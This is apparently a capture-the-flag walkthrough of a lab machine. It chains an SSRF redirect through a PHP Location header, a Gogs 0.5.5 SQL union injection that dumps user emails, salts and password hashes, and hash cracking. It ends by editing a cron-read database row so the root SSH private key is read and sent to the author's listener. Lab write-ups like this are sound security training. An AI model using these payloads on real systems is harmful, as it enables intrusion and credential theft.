Following a guide for this one was stuck on the union injection in foothold.

IP: 10.10.11.176
# Enumeration
## Nmap
```bash
Host is up (0.0087s latency).
Not shown: 997 closed ports
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 32:b7:f4:d4:2f:45:d3:30:ee:12:3b:03:67:bb:e6:31 (RSA)
|   256 86:e1:5d:8c:29:39:ac:d7:e8:15:e6:49:e2:35:ed:0c (ECDSA)
|_  256 ef:6b:ad:64:d5:e4:5b:3e:66:79:49:f4:ec:4c:23:9f (ED25519)
80/tcp   open     http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HTTP Monitoring Tool
3000/tcp filtered ppp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
3 ports not closed.
## Port 80
Seems to be a utility to check if a website is up. We can check if it works by using our IP. `10.10.14.47`
```
Payload URL: http://10.10.14.47:9001
Monitored URL: http://10.10.14.47
Interval: */1 * * * *
Under what circumstances should the webhook be sent? Always
```
Listening on both port 9001 and 80 then sending the request.

Connection on port 80 first then a json request to 9001.
# Explotation
## WAF Bypass
When trying to get the webhook to call localhost says the request is not allowed. Instead of directly calling the URL we can use a redirect header in php which will forward the request from our host to the box.
```
webhook -[send request]-> host -[redirect]-> tagertserver port 3000
```
Testing this works.

Create index.php
```php
<?php
header('Location: http://127.0.0.1:3000');
die();
?>
```
Start the server
```bash
sudo php -S 0.0.0.0:9002
```
Checking it works locally.
```bash
curl localhost:9002 -v
```
This shows the location header now to test it on the targetserver.

Which gives back a blob of json
```
{"webhookUrl":"http:\/\/10.10.14.47:9001","monitoredUrl":"http:\/\/10.10.14.47:9002","health":"up","body":"<!DOCTYPE html>\n<html>\n\t<head data-suburl=\"\">\n\t\t<meta http-equiv=\"Content-Type\" content=\"text\/html; charset=UTF-8\" \/>\n        <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"\/>\n        <meta name=\"author\" content=\"Gogs - Go Git Service\" \/>\n\t\t<meta name=\"description\" content=\"Gogs(Go Git Service) a painless self-hosted Git Service written in Go\" \/>\n\t\t<meta name=\"keywords\" content=\"go, git, self-hosted, gogs\">\n\t\t<meta name=\"_csrf\" content=\"0wIGX_WAnsXjmc5VLzlfKJs9Iqo6MTY3NDEzNTE1NjA3NDA0NjMwMg==\" \/>\n\t\t\n\n\t\t<link rel=\"shortcut icon\" href=\"\/img\/favicon.png\" \/>\n\n\t\t\n\t\t<link rel=\"stylesheet\" href=\"\/\/maxcdn.bootstrapcdn.com\/font-awesome\/4.2.0\/css\/font-awesome.min.css\">\n\n\t\t<script src=\"\/\/code.jquery.com\/jquery-1.11.1.min.js\"><\/script>\n\t\t\n\t\t\n\t\t<link rel=\"stylesheet\" href=\"\/ng\/css\/ui.css\">\n\t\t<link rel=\"stylesheet\" href=\"\/ng\/css\/gogs.css\">\n\t\t<link rel=\"stylesheet\" href=\"\/ng\/css\/tipsy.css\">\n\t\t<link rel=\"stylesheet\" href=\"\/ng\/css\/magnific-popup.css\">\n\t\t<link rel=\"stylesheet\" href=\"\/ng\/fonts\/octicons.css\">\n\t\t<link rel=\"stylesheet\" href=\"\/css\/github.min.css\">\n\n\t\t\n    \t<script src=\"\/ng\/js\/lib\/lib.js\"><\/script>\n    \t<script src=\"\/ng\/js\/lib\/jquery.tipsy.js\"><\/script>\n    \t<script src=\"\/ng\/js\/lib\/jquery.magnific-popup.min.js\"><\/script>\n        <script src=\"\/ng\/js\/utils\/tabs.js\"><\/script>\n        <script src=\"\/ng\/js\/utils\/preview.js\"><\/script>\n\t\t<script src=\"\/ng\/js\/gogs.js\"><\/script>\n\n\t\t<title>Gogs: Go Git Service<\/title>\n\t<\/head>\n\t<body>\n\t\t<div id=\"wrapper\">\n\t\t<noscript>Please enable JavaScript in your browser!<\/noscript>\n\n<header id=\"header\">\n    <ul class=\"menu menu-line container\" id=\"header-nav\">\n        \n\n        \n            \n            <li class=\"right\" id=\"header-nav-help\">\n                <a target=\"_blank\" href=\"http:\/\/gogs.io\/docs\"><i class=\"octicon octicon-info\"><\/i>&nbsp;&nbsp;Help<\/a>\n            <\/li>\n            <li class=\"right\" id=\"header-nav-explore\">\n                <a href=\"\/explore\"><i class=\"octicon octicon-globe\"><\/i>&nbsp;&nbsp;Explore<\/a>\n            <\/li>\n            \n        \n    <\/ul>\n<\/header>\n<div id=\"promo-wrapper\">\n    <div class=\"container clear\">\n        <div id=\"promo-logo\" class=\"left\">\n            <img src=\"\/img\/gogs-lg.png\" alt=\"logo\" \/>\n        <\/div>\n        <div id=\"promo-content\">\n            <h1>Gogs<\/h1>\n            <h2>A painless self-hosted Git service written in Go<\/h2>\n            <form id=\"promo-form\" action=\"\/user\/login\" method=\"post\">\n                <input type=\"hidden\" name=\"_csrf\" value=\"0wIGX_WAnsXjmc5VLzlfKJs9Iqo6MTY3NDEzNTE1NjA3NDA0NjMwMg==\">\n                <input class=\"ipt ipt-large\" id=\"username\" name=\"uname\" type=\"text\" placeholder=\"Username or E-mail\"\/>\n                <input class=\"ipt ipt-large\" name=\"password\" type=\"password\" placeholder=\"Password\"\/>\n                <input name=\"from\" type=\"hidden\" value=\"home\">\n                <button class=\"btn btn-black btn-large\">Sign In<\/button>\n                <button class=\"btn btn-green btn-large\" id=\"register-button\">Register<\/button>\n            <\/form>\n            <div id=\"promo-social\" class=\"social-buttons\">\n                \n\n\n\n            <\/div>\n        <\/div>&nbsp;\n    <\/div>\n<\/div>\n<div id=\"feature-wrapper\">\n    <div class=\"container clear\">\n        \n        <div class=\"grid-1-2 left\">\n            <i class=\"octicon octicon-flame\"><\/i>\n            <b>Easy to install<\/b>\n            <p>Simply <a target=\"_blank\" href=\"http:\/\/gogs.io\/docs\/installation\/install_from_binary.html\">run the binary<\/a> for your platform. Or ship Gogs with <a target=\"_blank\" href=\"https:\/\/github.com\/gogits\/gogs\/tree\/master\/dockerfiles\">Docker<\/a> or <a target=\"_blank\" href=\"https:\/\/github.com\/geerlingguy\/ansible-vagrant-examples\/tree\/master\/gogs\">Vagrant<\/a>, or get it <a target=\"_blank\" href=\"http:\/\/gogs.io\/docs\/installation\/install_from_packages.html\">packaged<\/a>.<\/p>\n        <\/div>\n        <div class=\"grid-1-2 left\">\n            <i class=\"octicon octicon-device-desktop\"><\/i>\n            <b>Cross-platform<\/b>\n            <p>Gogs runs anywhere <a target=\"_blank\" href=\"http:\/\/golang.org\/\">Go<\/a> can compile for: Windows, Mac OS X, Linux, ARM, etc. Choose the one you love!<\/p>\n        <\/div>\n        <div class=\"grid-1-2 left\">\n            <i class=\"octicon octicon-rocket\"><\/i>\n            <b>Lightweight<\/b>\n            <p>Gogs has low minimal requirements and can run on an inexpensive Raspberry Pi. Save your machine energy!<\/p>\n        <\/div>\n        <div class=\"grid-1-2 left\">\n            <i class=\"octicon octicon-code\"><\/i>\n            <b>Open Source<\/b>\n            <p>It's all on <a target=\"_blank\" href=\"https:\/\/github.com\/gogits\/gogs\/\">GitHub<\/a>! Join us by contributing to make this project even better. Don't be shy to be a contributor!<\/p>\n        <\/div>\n        \n    <\/div>\n<\/div>\n\t\t<\/div>\n\t\t<footer id=\"footer\">\n\t\t    <div class=\"container clear\">\n\t\t        <p class=\"left\" id=\"footer-rights\">\u00a9 2014 GoGits \u00b7 Version: 0.5.5.1010 Beta \u00b7 Page: <strong>1ms<\/strong> \u00b7\n\t\t            Template: <strong>1ms<\/strong><\/p>\n\n\t\t        <div class=\"right\" id=\"footer-links\">\n\t\t            <a target=\"_blank\" href=\"https:\/\/github.com\/gogits\/gogs\"><i class=\"fa fa-github-square\"><\/i><\/a>\n\t\t            <a target=\"_blank\" href=\"https:\/\/twitter.com\/gogitservice\"><i class=\"fa fa-twitter\"><\/i><\/a>\n\t\t            <a target=\"_blank\" href=\"https:\/\/plus.google.com\/communities\/115599856376145964459\"><i class=\"fa fa-google-plus\"><\/i><\/a>\n\t\t            <a target=\"_blank\" href=\"http:\/\/weibo.com\/gogschina\"><i class=\"fa fa-weibo\"><\/i><\/a>\n\t\t            <div id=\"footer-lang\" class=\"inline drop drop-top\">Language\n\t\t                <div class=\"drop-down\">\n\t\t                    <ul class=\"menu menu-vertical switching-list\">\n\t\t                    \t\n\t\t                        <li><a href=\"#\">English<\/a><\/li>\n\t\t                        \n\t\t                        <li><a href=\"\/?lang=zh-CN\">\u7b80\u4f53\u4e2d\u6587<\/a><\/li>\n\t\t                        \n\t\t                        <li><a href=\"\/?lang=zh-HK\">\u7e41\u9ad4\u4e2d\u6587<\/a><\/li>\n\t\t                        \n\t\t                        <li><a href=\"\/?lang=de-DE\">Deutsch<\/a><\/li>\n\t\t                        \n\t\t                        <li><a href=\"\/?lang=fr-CA\">Fran\u00e7ais<\/a><\/li>\n\t\t                        \n\t\t                        <li><a href=\"\/?lang=nl-NL\">Nederlands<\/a><\/li>\n\t\t                        \n\t\t                    <\/ul>\n\t\t                <\/div>\n\t\t            <\/div>\n\t\t            <a target=\"_blank\" href=\"http:\/\/gogs.io\">Website<\/a>\n\t\t            <span class=\"version\">Go1.3.2<\/span>\n\t\t        <\/div>\n\t\t    <\/div>\n\t\t<\/footer>\n\t<\/body>\n<\/html>","message":"HTTP\/1.0 302 Found","headers":{"Host":"10.10.14.47:9002","Date":"Thu, 19 Jan 2023 13:32:36 GMT","Connection":"close","X-Powered-By":"PHP\/8.1.2-1ubuntu2.9","Location":"http:\/\/127.0.0.1:3000","Content-type":"text\/html; charset=UTF-8","Content-Type":"text\/html; charset=UTF-8","Set-Cookie":"_csrf=; Path=\/; Max-Age=0"}}
```
## Gogs vulnerability
Tidying up the file with jq
```bash
cat page.json | jq .body -r > file.html
```
Viewing the page in a browser shows that it is a Gogs instance version 0.5.5.1010 Beta.

Checking exploitdb there is a sql injection.
the POC
```sql
http://www.example.com/api/v1/repos/search?q=') UNION SELECT * FROM 
(SELECT null) AS a1  JOIN (SELECT 1) as u JOIN (SELECT 
user()) AS b1 JOIN (SELECT user()) AS b2 JOIN (SELECT null)
 as a3  JOIN (SELECT null) as a4  JOIN (SELECT null) 
as a5  JOIN (SELECT null) as a6  JOIN (SELECT null) as
 a7  JOIN (SELECT null) as a8  JOIN (SELECT null) as 
a9 JOIN (SELECT null) as a10 JOIN (SELECT null) as a11 
JOIN (SELECT null) as a12 JOIN (SELECT null) as a13  JOIN
 (SELECT null) as a14  JOIN (SELECT null) as a15  JOIN
 (SELECT null) as a16  JOIN (SELECT null) as a17  JOIN
 (SELECT null) as a18  JOIN (SELECT null) as a19  JOIN
 (SELECT null) as a20  JOIN (SELECT null) as a21  JOIN
 (SELECT null) as a22 where ('%'='
```
### Local instance
As we have to send this via a CSRF it would be easier to spin it up locally for testing and debugging. Searching Github you can find a v0.5.5 instance and code.

Starting the server
```bash
gogs/gogs web
```
Now it is set up locally on port 3000.

Instead of using the payload in POC going to try to do a simple union injection on the endpoint.
```http
http://localhost:3000/api/v1/users/search?q=%27)%20union%20select%201--%20-
```
This errors out?

The POC seems to swap the spaces for tabs (%09)
```http
/api/v1/users/search?q=')%09union%09select%091--%09- 
```
Which responds with
```json
"error": "SELECTs to the left and right of UNION do not have the same number of result columns",
"ok": false
```
Which means the injection works! :)

As we have the source code we can just see how many columns we need.
```bash
sqlite3 gogs/data/gogs.db  .schema user | grep 'CREATE TABLE `user`' | sed  's/,/\n/g' | wc -l
```
which gives 27
This returns but doesnt show any users.
changing the injection to be:
```sql
')%09union%09all%09select%091,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--%09-
```
Shows that 3 is the injectable column, now to exfil data. From the database we need email, passwd and salt. This can be done with concat.
```sql
')%09union%09all%09select%091,2,(select%09email%09from%09user)||':'||(select%09salt%09from%09user)||':'||(select%09passwd%09from%09user),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--%09-
```
Which returns
```
server@a.com:2mQB3qmtJb:5beefe2e36f32d4d72ca9c916d51e2f8ee16468f942cf90f3c4723154312168f7716b248a3c4fed0783754cf5af3e03f6360
```
Checking the source code for how the passwd is hashed. (models/user.go). Its a PBKDF2 with 10000 iterations hashed with sha256. 

Checking hashcat shows that it is mode 10900 `PBKDF2-HMAC-SHA256`
```
sha256:1000:MTc3MTA0MTQwMjQxNzY=:PYjCU215Mi57AYPKva9j7mvF4Rc5bCnt
```
Convert the hash to base64 and testing if it works. We need to decode from hex first.
```
echo 5beefe2e36f32d4d72ca9c916d51e2f8ee16468f942cf90f3c4723154312168f7716b248a3c4fed0783754cf5af3e03f6360 -n | xxd -p -r | base64 -w0
```
Then hashcat
```bash
sha256:10000:Mm1RQjNxbXRKYgo=:W+7+LjbzLU1yypyRbVHi+O4WRo+ULPkPPEcjFUMSFo93FrJIo8T+0Hg3VM9a8+A/Y2A=
```
Now to send it to the server
### Remote instance
With the working payload:
```
/api/v1/users/search?q=')%09union%09all%09select%091,2,(select%09email%09from%09user)||':'||(select%09salt%09from%09user)||':'||(select%09passwd%09from%09user),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--%09-
```
We can append it to the location header in index.php
```php
<?php
header("Location: http://127.0.0.1:3000/api/v1/users/search?q=')%09union%09all%09select%091,2,(select%09email%09from%09user)||':'||(select%09salt%09from%09user)||':'||(select%09passwd%09from%09user),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--%09-");
die();
?>
```
Starting the php server and nc listener again and sending the request should give back the hash.
```
Payload URL: http://10.10.14.47:9001
Monitored URL: http://10.10.14.47:9002
Interval: */1 * * * *
Under what circumstances should the webhook be sent? Always
```
Which gives
```
{"webhookUrl":"http:\/\/10.10.14.47:9001","monitoredUrl":"http:\/\/10.10.14.47:9002","health":"up","body":"{\"data\":[{\"username\":\"susanne\",\"avatar\":\"\/\/1.gravatar.com\/avatar\/c11d48f16f254e918744183ef7b89fce\"},{\"username\":\"admin@gogs.local:sO3XIbeW14:66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37\",\"avatar\":\"\/\/1.gravatar.com\/avatar\/15\"}],\"ok\":true}","message":"HTTP\/1.0 302 Found","headers":{"Host":"10.10.14.47:9002","Date":"Thu, 19 Jan 2023 14:45:09 GMT","Connection":"close","X-Powered-By":"PHP\/8.1.2-1ubuntu2.9","Location":"http:\/\/127.0.0.1:3000\/api\/v1\/users\/search?q=')%09union%09all%09select%091,2,(select%09email%09from%09user)||':'||(select%09salt%09from%09user)||':'||(select%09passwd%09from%09user),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--%09-","Content-type":"text\/html; charset=UTF-8","Content-Type":"application\/json; charset=UTF-8","Set-Cookie":"_csrf=; Path=\/; Max-Age=0","Content-Length":"293"}}
```
sending it through jq:
```json
cat reply.json | jq .body -r | jq .data
[
  {
    "username": "susanne",
    "avatar": "//1.gravatar.com/avatar/c11d48f16f254e918744183ef7b89fce"
  },
  {
    "username": "admin@gogs.local:sO3XIbeW14:66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37",
    "avatar": "//1.gravatar.com/avatar/15"
  }
]

```
base64 encode both parts and crack the hash.
```
sha256:10000:c08zWEliZVcxNA==:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=
```
which works! `february15`

Check ssh for both admin and susanne, It works for susanne.
```
Userflag: 6c8c013a7d02b89fa558c8f2e409a51c
```
# Priv Esc
Check the web server for passwords.
```
grep -R -i 'password='
```
Shows a result in the .env file.
```
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=laravel
DB_USERNAME=laravel
DB_PASSWORD=MYsql_strongestpass@2014+
```
checking the database shows nothing of value.

Running pspy on the box.
```
2023/01/20 14:27:01 CMD: UID=0     PID=27212  | /usr/sbin/CRON -f 
2023/01/20 14:27:01 CMD: UID=0     PID=27211  | /usr/sbin/CRON -f 
2023/01/20 14:27:01 CMD: UID=0     PID=27216  | php artisan schedule:run 
2023/01/20 14:27:01 CMD: UID=0     PID=27215  | sleep 5 
2023/01/20 14:27:01 CMD: UID=0     PID=27219  | grep columns 
2023/01/20 14:27:01 CMD: UID=0     PID=27218  | 
2023/01/20 14:27:01 CMD: UID=0     PID=27217  | sh -c stty -a | grep columns 
2023/01/20 14:27:02 CMD: UID=0     PID=27222  | grep columns 
2023/01/20 14:27:02 CMD: UID=0     PID=27221  | 
2023/01/20 14:27:02 CMD: UID=0     PID=27220  | sh -c stty -a | grep columns 
2023/01/20 14:27:06 CMD: UID=0     PID=27223  | mysql laravel --execute TRUNCATE tasks 
2023/01/20 14:28:01 CMD: UID=0     PID=27227  | /usr/sbin/CRON -f 
2023/01/20 14:28:01 CMD: UID=0     PID=27226  | /bin/bash -c cd /var/www/html && php artisan schedule:run >> /dev/null 2>&1
```
## Source code analysis
This seems to be calling schedule from the php server. Finding the file shows that it calls the check function within HealthChecker
```bash
grep -i -r 'function schedule'
```
```php
protected function schedule(Schedule $schedule)
{

	/* Get all tasks from the database */
	$tasks = Task::all();

	foreach ($tasks as $task) {

		$frequency = $task->frequency;

		$schedule->call(function () use ($task) {
			/*  Run your task here */
			HealthChecker::check($task->webhookUrl, $task->monitoredUrl, $task->onlyError);
			Log::info($task->id . ' ' . \Carbon\Carbon::now());
		})->cron($frequency);
	}
```
Within the check function it calls `file_get_contents` on the monitoredUrl. This should allow for an LFI.
```php
public static function check($webhookUrl, $monitoredUrl, $onlyError = false)
{
...
@file_get_contents($monitoredUrl, false);
	if ($res) {

		if ($onlyError) {
			return $json;
		}
...
```
## SQL database poisoning  
Going back to the sql table we should be able to poison the database and change the parameter to grab the root ssh key. (or root flag)
```bash
mysql -u laravel -p
```
```sql
use laravel;
select * from tasks;
```
Sending another request form the website, but this time creating a task.
```
Payload URL: http://10.10.14.47:9001
Monitored URL: http://10.10.14.47:9002
Interval: */5 * * * *
Under what circumstances should the webhook be sent? Always
```
When sending the request the sql table now has an entry. Starting a listener and changing the monitoredURL.
```sql
mysql> update tasks set monitoredUrl = 'file:///root/.ssh/id_rsa';
```
This dumps the ssh key :)
```bash
cat key.json | jq .body -r > root_key
chmod 600 root_key
ssh -i root_key root@10.10.11.176
```

Root flag:
```
a09e84e7f6a4f241b4c8a0596acafaea
```
